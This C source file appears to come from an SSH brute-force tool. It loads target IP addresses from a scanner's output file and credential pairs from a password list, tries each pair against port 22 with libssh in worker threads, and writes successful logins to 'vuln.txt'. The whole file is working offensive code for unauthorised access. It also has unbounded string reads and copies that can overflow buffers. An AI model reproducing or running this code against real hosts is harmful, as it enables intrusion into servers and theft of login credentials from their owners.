//
// Created by darko on 4/30/18.
//

#include "utils.h"

struct stat sb;

/**
 * Returns minimum of two numbers.
 * @param number1
 * @param number2
 * @return
 */
int min(int number1, int number2) {
    return number1 < number2 ? number1 : number2;
}

/**
 * The t_login_combination constructor
 * @param user
 * @param pass
 * @return
 */
t_login_combination *t_combination_create(char *user, char *pass) {
    unsigned int userL = strlen(user);
    unsigned int passL = strlen(pass);
    t_login_combination *p = malloc(sizeof(t_login_combination));
    p->username = malloc((userL + 1));
    p->password = malloc((passL + 1));
    strncpy(p->username, user, userL);
    strncpy(p->password, pass, passL);
    p->username[userL] = '\0';
    p->password[passL] = '\0';
    return p;
}

/**
 * The t_login_combination constructor
 * @param user
 * @param pass
 * @return
 */
t_ip_address *t_ipaddress_create(char *ipaddr) {
    t_ip_address *p = malloc(sizeof(t_ip_address));
    unsigned int len = strlen(ipaddr);
    strncpy(p->ip, ipaddr, len);
    p->ip[len] = '\0';
    return p;
}

/**
 * The thread data object create
 * @param ip_addresses
 * @param combinations
 * @return
 */
t_config *t_config_create() {
    t_config *p = malloc(sizeof(t_config));
    return p;
}

/**
 * The thread data object create
 * @param ip_addresses
 * @param combinations
 * @return
 */
t_thread_data *t_thread_data_create() {
    t_thread_data *p = malloc(sizeof(t_thread_data));
    return p;
}

/**
 * The t_login_combination destructor
 * @param combination
 * @return void
 */
void *t_combination_destroy(t_login_combination *self) {
    free(self);
    self = NULL;
}

/**
 * The t_login_combination destructor
 * @param ipaddr
 * @return void
 */
void *t_ipaddress_destroy(t_ip_address *self) {
    free(self);
    self = NULL;
}

/**
 * The thread data destructor
 * @param data
 * @return void
 */
void *t_thread_data_destroy(t_thread_data *self) {
    free(self);
    self = NULL;
}

/**
 * Writes text to file
 * @param msg
 * @param filename
 * @param flag
 */
void write_to_file(char *msg, char *filename, char *flag) {
    FILE *f;
    f = fopen(filename, flag); // a+ (create + append) option will allow appending which is useful in a log file
    if (f == NULL) {
        return;
    }
    fprintf(f, "%s\n", msg);
    fclose(f);
}

/**
 * Write
 * @param username
 * @param password
 * @param host
 * @return
 */
void write_auth_details(char *username, char *password, char *host) {
    char msg[300];
    if (sprintf(msg, "%s:%s %s", username, password, host)) {
        write_to_file(msg, "vuln.txt", "a+");
    }
}

/**
 * Write log
 * @param msg
 */
void write_log(char *msg) {
    write_to_file(msg, "log.txt", "a+");
}

/**
 * Is valid ipv4
 * @param ipAddress
 * @return
 */
int is_valid_ipv4(char *ipAddress) {
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
    return result != 0;
}

/**
 * Creates dir if not exist
 * @param dir
 * @return
 */
int maybe_create_dir(char *dir) {
    if (stat(dir, &sb) == -1) {
        return mkdir(dir, 0700);
    } else {
        return 0;
    }
}

/**
 * The ip addresses found by pscan2
 * @return
 */
list_t *get_ip_addresses() {

    char *filename = "ips.txt";
    FILE *file = fopen(filename, "r");

    list_t *ips = list_new();
    if (file != NULL) {
        char ip[16];
        while (1) {
            int ret = fscanf(file, "%15s", ip);
            if (ret == 1) {
                if (is_valid_ipv4(ip)) {
                    t_ip_address *ip_address = t_ipaddress_create(ip);
                    list_node_t *node = list_node_new(ip_address);
                    list_rpush(ips, node);
                }
            } else if (errno != 0) {
                continue;
            } else {
                break;
            }
        }
        fclose(file);
    } else {
        printf("File %s does not exist or can not be opened\n", filename);
        exit(-1);
    }
    return ips;
}

/**
 * Used to collect the combinations from the pass file
 * @return
 */
list_t *get_user_pass_combinations() {

    char *filename = "pass_file";
    FILE *file = fopen(filename, "r");

    list_t *combinations = list_new();

    if (file != NULL) {
        while (1) {
            char user[255] = {'\0'};
            char pass[255] = {'\0'};
            int ret = fscanf(file, "%s %s\n", user, pass);
            if (ret == 2) {
                t_login_combination *c = t_combination_create(user, pass);
                list_node_t *node = list_node_new(c);
                list_rpush(combinations, node);
                //printf("Username: %s, Password: %s\n", c->username, c->password);
            } else if (errno != 0) {
                continue;
            } else {
                break;
            }
        }
        fclose(file);
    } else {
        printf("File %s does not exist or can not be opened\n", filename);
        exit(-1);
    }
    return combinations;
}

/**
 * Verify ssh auth
 * @param username
 * @param password
 * @param host
 * @return
 */
int ssh_auth(char *username, char *password, char *host) {
    ssh_session my_ssh_session;
    int rc;
    int timeout = 5;
    int port = 22;
    // Open session and set options
    my_ssh_session = ssh_new();
    if (my_ssh_session == NULL)
        return 0;
    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, host);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &timeout);
    // Connect to server
    rc = ssh_connect(my_ssh_session);
    if (rc != SSH_OK) {
        write_log((char *) ssh_get_error(my_ssh_session));
        ssh_free(my_ssh_session);
        return 0;
    }
    // Authenticate ourselves
    rc = ssh_userauth_password(my_ssh_session, username, password);
    if (rc != SSH_AUTH_SUCCESS) {
        write_log((char *) ssh_get_error(my_ssh_session));
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        return 0;
    } else {
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        return 1;
    }
}

/**
 * Attack target
 * @param ip_object
 * @param config
 */
void attack_target(t_ip_address *ip_object, t_config *config) {

    list_t *combinations = get_user_pass_combinations();
    list_node_t *node;
    list_iterator_t *it = list_iterator_new(combinations, LIST_HEAD);
    while ((node = list_iterator_next(it))) {
        t_login_combination *c = (t_login_combination *) node->val;
        if (config->debug) {
            printf("Checking: %s:%s -> %s\n", c->username, c->password, ip_object->ip);
        }
        int result = ssh_auth(c->username, c->password, ip_object->ip);
        if (result) {
            if (config->debug) {
                printf("Success: %s:%s -> %s\n", c->username, c->password, ip_object->ip);
            }
            write_auth_details(c->username, c->password, ip_object->ip);
        }
    }
    list_iterator_destroy(it);
    if (combinations) {
        list_destroy(combinations);
    }

}

/**
 * Chunk process from thread
 * @param t_data
 * @return
 */
void process_chunk(void *t_data) {
    // Store the value argument passed to this thread
    t_thread_data *data = (t_thread_data *) t_data;
    if (data->ip_address) {
        attack_target(data->ip_address, data->config);
    } else {
        write_log("No valid data assigned to the thread");
    }
}


